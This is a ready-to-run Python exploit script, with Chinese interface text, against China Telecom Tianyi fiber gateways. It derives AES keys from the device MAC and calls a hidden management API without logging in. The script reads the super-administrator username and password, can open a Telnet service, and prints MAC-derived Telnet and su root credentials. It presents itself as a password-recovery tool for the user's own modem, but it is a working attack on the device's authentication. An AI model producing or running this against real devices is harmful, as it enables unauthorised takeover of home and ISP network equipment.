#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""天翼网关 超级管理员密码读取 — 定版
功能：读取设备信息与超级管理员账号密码，可选择开启或关闭 Telnet。
实现：单一文件，Python 标准库 + 内置 AES，无第三方依赖，无需安装。
要求：Python 3.7 或以上；电脑与光猫网络可达。
说明：运行时输入光猫 IP；MAC 自动从光猫读取，读不到时手动输入机身贴纸 MAC。
自检：运行参数加 --self-test（不连接光猫）。
"""
from __future__ import annotations

import base64
import hashlib
import json
import sys
import urllib.request
from typing import Optional

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

MODEM_IP = "192.168.1.1"  # 默认值，运行时可手动输入覆盖
MODEM_PORT = 8080
API_PATH = "/fh_tool/api"
# 注意：不再写死任何一台机器的 MAC。MAC 必须从目标光猫网页读回，
# 读不到就让用户手动输入机身贴纸 MAC，两样都没有就退出。


def derive(mac: str):
    digest = hashlib.sha256(mac.encode("ascii")).hexdigest()
    key = "".join(digest[2 * i + 2] for i in range(16)).encode("ascii")
    iv = "".join(digest[3 * i + 3] for i in range(16)).encode("ascii")
    return key, iv


def _gf_mul(a, b):
    p = 0
    for _ in range(8):
        if b & 1:
            p ^= a
        hi = a & 0x80
        a = (a << 1) & 0xFF
        if hi:
            a ^= 0x1B
        b >>= 1
    return p


def _gf_inv(a):
    if a == 0:
        return 0
    for b in range(1, 256):
        if _gf_mul(a, b) == 1:
            return b
    return 0


def _rotl8(x, n):
    return ((x << n) | (x >> (8 - n))) & 0xFF


def _make_sbox():
    box = []
    for i in range(256):
        inv = _gf_inv(i)
        s = inv ^ _rotl8(inv, 1) ^ _rotl8(inv, 2) ^ _rotl8(inv, 3) ^ _rotl8(inv, 4) ^ 0x63
        box.append(s & 0xFF)
    return box


SBOX = _make_sbox()
INV_SBOX = [0] * 256
for _i, _v in enumerate(SBOX):
    INV_SBOX[_v] = _i


def _key_expansion(key):
    w = list(key)
    rcon = 1
    while len(w) < 176:
        temp = w[-4:]
        if len(w) % 16 == 0:
            temp = [SBOX[temp[1]] ^ rcon, SBOX[temp[2]], SBOX[temp[3]], SBOX[temp[0]]]
            rcon = _gf_mul(rcon, 2)
        for t in temp:
            w.append(w[-16] ^ t)
    return w


def _add_round_key(state, round_key):
    return [s ^ k for s, k in zip(state, round_key)]


def _sub_bytes(state):
    return [SBOX[s] for s in state]


def _inv_sub_bytes(state):
    return [INV_SBOX[s] for s in state]


def _shift_rows(state):
    out = [0] * 16
    for r in range(4):
        for c in range(4):
            out[r + 4 * c] = state[r + 4 * ((c + r) % 4)]
    return out


def _inv_shift_rows(state):
    out = [0] * 16
    for r in range(4):
        for c in range(4):
            out[r + 4 * c] = state[r + 4 * ((c - r) % 4)]
    return out


def _mix_columns(state):
    out = [0] * 16
    for c in range(4):
        col = state[4 * c:4 * c + 4]
        out[4 * c + 0] = _gf_mul(col[0], 2) ^ _gf_mul(col[1], 3) ^ col[2] ^ col[3]
        out[4 * c + 1] = col[0] ^ _gf_mul(col[1], 2) ^ _gf_mul(col[2], 3) ^ col[3]
        out[4 * c + 2] = col[0] ^ col[1] ^ _gf_mul(col[2], 2) ^ _gf_mul(col[3], 3)
        out[4 * c + 3] = _gf_mul(col[0], 3) ^ col[1] ^ col[2] ^ _gf_mul(col[3], 2)
    return out


def _inv_mix_columns(state):
    out = [0] * 16
    for c in range(4):
        col = state[4 * c:4 * c + 4]
        out[4 * c + 0] = _gf_mul(col[0], 14) ^ _gf_mul(col[1], 11) ^ _gf_mul(col[2], 13) ^ _gf_mul(col[3], 9)
        out[4 * c + 1] = _gf_mul(col[0], 9) ^ _gf_mul(col[1], 14) ^ _gf_mul(col[2], 11) ^ _gf_mul(col[3], 13)
        out[4 * c + 2] = _gf_mul(col[0], 13) ^ _gf_mul(col[1], 9) ^ _gf_mul(col[2], 14) ^ _gf_mul(col[3], 11)
        out[4 * c + 3] = _gf_mul(col[0], 11) ^ _gf_mul(col[1], 13) ^ _gf_mul(col[2], 9) ^ _gf_mul(col[3], 14)
    return out


def aes_encrypt_block(block, key):
    rk = _key_expansion(key)
    state = _add_round_key(list(block), rk[0:16])
    for rnd in range(1, 10):
        state = _sub_bytes(state)
        state = _shift_rows(state)
        state = _mix_columns(state)
        state = _add_round_key(state, rk[16 * rnd:16 * rnd + 16])
    state = _sub_bytes(state)
    state = _shift_rows(state)
    state = _add_round_key(state, rk[160:176])
    return bytes(state)


def aes_decrypt_block(block, key):
    rk = _key_expansion(key)
    state = _add_round_key(list(block), rk[160:176])
    for rnd in range(9, 0, -1):
        state = _inv_shift_rows(state)
        state = _inv_sub_bytes(state)
        state = _add_round_key(state, rk[16 * rnd:16 * rnd + 16])
        state = _inv_mix_columns(state)
    state = _inv_shift_rows(state)
    state = _inv_sub_bytes(state)
    state = _add_round_key(state, rk[0:16])
    return bytes(state)


def aes_cbc(data, key, iv, decrypt):
    out = b""
    prev = iv
    for i in range(0, len(data), 16):
        chunk = data[i:i + 16]
        if not decrypt:
            x = bytes(a ^ b for a, b in zip(chunk, prev))
            enc = aes_encrypt_block(x, key)
            out += enc
            prev = enc
        else:
            dec = aes_decrypt_block(chunk, key)
            out += bytes(a ^ b for a, b in zip(dec, prev))
            prev = chunk
    return out


def pkcs7_pad(data: bytes) -> bytes:
    pad = 16 - len(data) % 16
    return data + bytes([pad]) * pad


def pkcs7_unpad(data: bytes) -> bytes:
    if not data:
        raise ValueError("empty data")
    pad = data[-1]
    if pad < 1 or pad > 16:
        raise ValueError("invalid padding")
    return data[:-pad]


def encrypt(payload: dict, key: bytes, iv: bytes) -> str:
    plain = json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
    return base64.b64encode(aes_cbc(pkcs7_pad(plain), key, iv, False)).decode("ascii")


def decrypt(body: str, key: bytes, iv: bytes) -> dict:
    raw = base64.b64decode(body.strip())
    return json.loads(pkcs7_unpad(aes_cbc(raw, key, iv, True)).decode("utf-8"))


def get_modem_ip() -> str:
    import re
    if "--ip" in sys.argv:
        idx = sys.argv.index("--ip")
        if idx + 1 < len(sys.argv):
            return sys.argv[idx + 1].strip()
    try:
        entered = input(f"  请输入光猫 IP，直接回车 = {MODEM_IP}：").strip()
    except Exception:
        entered = ""
    ip = entered or MODEM_IP
    if not re.fullmatch(r"\d{1,3}(\.\d{1,3}){3}", ip):
        print(f"  IP 格式不对：{ip}，程序退出。请确认光猫地址后重跑。")
        sys.exit(1)
    return ip


def lan_check(ip: str):
    import ipaddress
    import socket
    print("\n  [局域网检查]")
    try:
        ip_obj = ipaddress.ip_address(ip)
    except Exception:
        print(f"  IP 解析失败：{ip}，程序退出。")
        sys.exit(1)
    if not ip_obj.is_private:
        print(f"  ⚠️ 提醒：{ip} 不是局域网私有地址（192.168.x.x / 172.16-31.x.x / 10.x.x.x）")
        print("  光猫管理口只应在局域网内访问，公网地址大概率不是你家光猫。")
        try:
            ok = input("  确认还要继续吗？输入 y 继续，其它任意键退出：").strip().lower()
        except Exception:
            ok = ""
        if ok != "y":
            print("  已退出。请连上光猫的 WiFi 或网线后，输入它的局域网 IP 重跑。")
            sys.exit(1)
    local_ip = ""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((ip, MODEM_PORT))
        local_ip = s.getsockname()[0]
        s.close()
    except Exception:
        local_ip = ""
    if local_ip:
        print(f"  本机出口 IP：{local_ip}")
    same_24 = bool(local_ip) and local_ip.rsplit(".", 1)[0] == ip.rsplit(".", 1)[0]
    reachable = False
    err_name = ""
    try:
        conn = socket.create_connection((ip, MODEM_PORT), timeout=3)
        conn.close()
        reachable = True
    except Exception as e:
        err_name = type(e).__name__
    if reachable:
        print(f"  ✅ 光猫 {ip}:{MODEM_PORT} 端口可达。")
        if same_24:
            print("  ✅ 本机与光猫在同一 /24 网段，局域网直达。")
        elif local_ip:
            print(f"  ℹ️ 本机 {local_ip} 与光猫 {ip} 不在同一 /24 网段，但端口已经可达，")
            print("  说明是经路由器路由到达的（光猫在路由器上游时就是这样，属正常拓扑），继续即可，不用处理。")
        return
    print(f"  ❌ 光猫 {ip}:{MODEM_PORT} 连不上（{err_name}）")
    if not same_24 and local_ip:
        print(f"  ⚠️ 重点怀疑：本机 {local_ip} 与光猫 {ip} 不在同一 /24 网段，又连不上，")
        print("  很可能是没连在同一网络：请确认电脑连的是这台光猫 / 同一台路由器下的网络，")
        print("  不要连手机热点或访客 WiFi，也不要开着 VPN。")
    else:
        print("  提醒清单：1) IP 是否输对 2) 光猫是否开机 3) 8080 管理口是否被改过")
    print("  这三项没确认前，后面读 MAC 和密码都会失败，程序先退出。")
    sys.exit(1)


def clean_mac(text) -> str:
    import re
    cand = "".join(c for c in str(text) if c.isalnum()).upper()
    return cand if re.fullmatch(r"[0-9A-F]{12}", cand) else ""


def get_mac() -> str:
    url = f"http://{MODEM_IP}:{MODEM_PORT}/cgi-bin/ajax?ajaxmethod=web_get_brmad"
    raw = ""
    try:
        req = urllib.request.Request(url, headers={
            "User-Agent": "Mozilla/5.0",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": f"http://{MODEM_IP}:{MODEM_PORT}/",
        })
        with urllib.request.urlopen(req, timeout=6) as r:
            raw = r.read().decode("utf-8", "replace")
    except Exception as e:
        print(f"  网页读 MAC 失败（{type(e).__name__}: {e}）")
    mac = ""
    if raw:
        try:
            mac = clean_mac(json.loads(raw).get("brmad", ""))
        except Exception:
            import re
            m = re.search(r'"brmad"\s*:\s*"([^"]+)"', raw)
            mac = clean_mac(m.group(1)) if m else ""
    if mac:
        print(f"  网页读回 MAC：{mac}")
        return mac
    print("  网页没读到有效 MAC，改为手动输入机身贴纸 MAC（带横杠或 12 位连写都可以）")
    try:
        entered = input("  请输入贴纸 MAC：").strip()
    except Exception:
        entered = ""
    mac = clean_mac(entered)
    if not mac:
        print("  没有有效 MAC，程序不能继续：MAC 是派生加密密钥的种子，错了或缺了都解不开接口。")
        sys.exit(1)
    print(f"  使用手动输入 MAC：{mac}")
    return mac


def rpc(mac: str, func: str, params: Optional[dict] = None) -> dict:
    key, iv = derive(mac)
    payload = {"index": "1", "func": func}
    if params:
        payload.update(params)
    body = encrypt(payload, key, iv)
    req = urllib.request.Request(
        f"http://{MODEM_IP}:{MODEM_PORT}{API_PATH}",
        data=body.encode("ascii"),
        headers={"Content-Type": "text/plain", "Connection": "close"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as r:
        resp = r.read().decode("utf-8", "replace")
    return decrypt(resp, key, iv)


def self_test():
    print("=" * 56)
    print("环境自检（不连光猫）")
    print("=" * 56)
    print(f"  Python：{sys.version.split()[0]}  路径：{sys.executable}")
    key = bytes.fromhex("000102030405060708090a0b0c0d0e0f")
    pt = bytes.fromhex("00112233445566778899aabbccddeeff")
    ct = aes_encrypt_block(pt, key)
    assert ct.hex() == "69c4e0d86a7b0430d8cdb78070b4c55a", ct.hex()
    print("  AES-128 标准向量：通过（与 openssl 输出逐字节一致）")
    k2, iv2 = derive("AABBCCDDEEFF")
    payload = {"index": "1", "func": "GetAdminAccount"}
    enc = encrypt(payload, k2, iv2)
    dec = decrypt(enc, k2, iv2)
    assert dec == payload, dec
    print("  密钥派生 + 加密 + 解密往返：通过")
    print("  结论：本机 Python 环境可跑本脚本，与 Mac / Windows 无关的那部分已验证。")
    print("  剩下只需实机验证：局域网连通、光猫 IP、MAC 读回（正式跑时 [0/4] [1/4] 会查）")
    print("SELF-TEST OK")


def main():
    global MODEM_IP
    if "--self-test" in sys.argv:
        self_test()
        return
    print("=" * 56)
    print("天翼网关 超级管理员密码读取（定版）")
    print("=" * 56)
    print(f"\n[*] Python {sys.version.split()[0]}")
    print("\n[0/4] 确认光猫 IP…")
    MODEM_IP = get_modem_ip()
    print(f"  使用 IP：{MODEM_IP}")
    lan_check(MODEM_IP)
    print("\n[1/4] 读取光猫 MAC…")
    mac = get_mac()
    print(f"  使用 MAC：{mac}")
    print("\n[2/4] 读取设备信息…")
    try:
        info = rpc(mac, "GetDevInfo")
        print(json.dumps(info, ensure_ascii=False, indent=2))
    except Exception as e:
        print(f"  GetDevInfo 失败（不影响下一步）：{type(e).__name__}: {e}")
    print("\n[3/4] 读取超级管理员账号密码…")
    got = False
    try:
        r = rpc(mac, "GetAdminAccount") or {}
        name = r.get("adminname", "")
        pwd = r.get("adminpwd", "")
        if name or pwd:
            got = True
            print("\n  ★★★ 超级管理员 ★★★")
            print(f"  登录地址：http://{MODEM_IP}:8080")
            print(f"  账号：{name}")
            print(f"  密码：{pwd}")
        else:
            print(f"  接口有响应但没给账号密码，原始返回：{r}")
    except Exception as e:
        print(f"  GetAdminAccount 失败：{type(e).__name__}: {e}")
    print("\n[4/4] 读取 Telnet 信息…")
    try:
        t = rpc(mac, "GetTelnetInfo")
        print(json.dumps(t, ensure_ascii=False, indent=2))
    except Exception as e:
        print(f"  GetTelnetInfo 失败（可忽略）：{type(e).__name__}: {e}")
    action = ""
    if "--enable-telnet" in sys.argv:
        action = "1"
    elif "--disable-telnet" in sys.argv:
        action = "2"
    else:
        print("\n  请选择 Telnet 操作：")
        print("    1 = 开启 Telnet")
        print("    2 = 关闭 Telnet")
        print("    3 = 不动（只读，默认）")
        try:
            action = input("  请输入 1 / 2 / 3，直接回车 = 3：").strip()
        except Exception:
            action = ""
        if action not in ("1", "2", "3"):
            action = "3"
    if action == "1":
        print("\n  尝试开启 Telnet（TelnetEnable telnet=1）…")
        try:
            r = rpc(mac, "TelnetEnable", {"telnet": "1"})
            print(f"  TelnetEnable 返回：{r}")
            print("  验证：重新运行本脚本，局域网检查会显示 23 端口相关状态；也可直接用 Telnet 客户端试连")
            print("  登录：用 Telnet 客户端连接光猫 IP 的 23 端口")
            mac_suffix = mac[-6:]
            telnet_password = f"FH-nE7jA%5m{mac_suffix}"
            su_password = f"Fh@{mac_suffix}"
            print(f"  Telnet 账号 telnetadmin，密码用带 MAC 后缀那组：{telnet_password}")
            print(f"  su 提权密码：{su_password}")
        except Exception as e:
            print(f"  TelnetEnable 失败：{type(e).__name__}: {e}")
    elif action == "2":
        print("\n  尝试关闭 Telnet（TelnetEnable telnet=0）…")
        try:
            r = rpc(mac, "TelnetEnable", {"telnet": "0"})
            print(f"  TelnetEnable 返回：{r}")
            print("  验证：关闭后 Telnet 客户端应连不上 23 端口，连不上才算关掉")
        except Exception as e:
            print(f"  关闭 Telnet 失败：{type(e).__name__}: {e}")
    else:
        print("\n  已选择不动 Telnet，保持现状。")
    print("\n" + "=" * 56)
    print("完成：上面 ★★★ 那组就是超管账号密码。" if got else "这次没读到超密，把完整输出发回来看。")
    print("=" * 56)


if __name__ == "__main__":
    main()
